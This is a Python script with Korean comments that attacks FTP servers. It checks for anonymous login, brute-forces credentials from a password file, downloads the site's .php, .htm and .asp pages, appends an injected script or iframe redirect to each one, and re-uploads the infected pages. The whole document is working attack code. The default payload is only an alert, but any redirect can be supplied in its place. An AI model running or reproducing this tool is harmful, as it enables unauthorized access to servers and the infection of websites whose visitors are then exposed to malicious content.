#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib
import time

def anonLogin(hostname): #익명 로그인
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com') #로그인
        print ('\n[*] ' + str(hostname) + ' FTP Anonymous 로그인 성공.')
        ftp.quit() #ftp 종료
        return True
    except Exception as e: #오류 발생시
        print ('\n[-] ' + str(hostname) + ' FTP Anonymous 로그인 실패.')
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r') #파일 열기
    print()
    for line in pF.readlines():
        time.sleep(1) #1초 대기
        userName = line.split(':')[0] #유저
        passWord = line.split(':')[1].strip('\r').strip('\n') #패스워드
        print ('[+] 시도 중: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord) #로그인
            print ('\n**** ' + str(hostname) + ' FTP 로그인 성공: '+ userName+'/'+passWord +' ****')
            ftp.quit() #ftp종료
            return (userName, passWord) #유저와 패스워드 리턴
        except Exception as e:
            pass
    print ('\n[-] Could not brute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    try:
        dirList = ftp.nlst() #파일 목록
    except:
        dirList = []
        print ('[-] 디렉터리가 존재 하지 않습니다..')
        print ('[-] 다음 타켓으로 이동합니다.')
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower() #소문자로 변환
        if '.php' in fn or '.htm' in fn or '.asp' in fn: #php, html, asp파일인 경우
            print ('[+] 기본 페이지 발견 : ' + fileName)
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w') #파일 열기
    ftp.retrlines('RETR ' + page, f.write) #ftp 파일 다운로드
    print ('[+] 페이지 다운로드 중 : ' + page)

    f.write(redirect) #파일 작성
    f.close() #파일 닫기
    print ('[+] 악성 Ifram으로 감염됨 : ' + page)
    f=open(page + '.tmp', 'rb')  #파일 열기
    ftp.storlines('STOR ' + page, f) #ftp 파일 저장
    print ('[+] 감염된 페이지를 업로드 : ' + page+'\n\n')


def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password) #ftp 로그인
    chdir=ftp.cwd("/home/"+username+"/public_html") #현재 위치 변경
    defPages = returnDefault(ftp) #기본 페이지 다운로드
    for defPage in defPages:
        injectPage(ftp, defPage, redirect) #페이지 공격


def main(tgtHost,passwdFile): #메인함수

    print('\n\n< ftp 공격을 시작합니다 >\n')

    redirect = "<script>alert('해킹위험');</script>"

    while tgtHost=='':
        tgtHost = input('호스트 입력 : ')

    # tgtHosts = tgtHosts.split(',')
    # print(tgtHosts)

    # for tgtHost in tgtHosts: #호스트
    username = None
    password = None

    if anonLogin(tgtHost) == True: #익명 로그인
        username = 'anonymous'
        password = 'me@your.com'
        print ('[+] Using Anonymous Creds to attack')
        
    while (passwdFile == '') or ('.txt' not in passwdFile):
        passwdFile = input('\n패스워드 파일명을 입력하세요. (.txt) : ')

    username, password = bruteLogin(tgtHost, passwdFile) #brute 공격
         
    if password != None: #패스워드가 있으면
        while redirect=='':
            redirect = input('redirect를 입력하세요 : ')
        print('[+] Using Creds: ' + username + '/' + password + ' to attack')
        try :
            attack(username, password, tgtHost, redirect) #공격  
            return username, password
        except:
            print(' => ftp 공격을 실패하였습니다.')
            return False

#if __name__ == '__main__':
    #main() #메인함수 실행
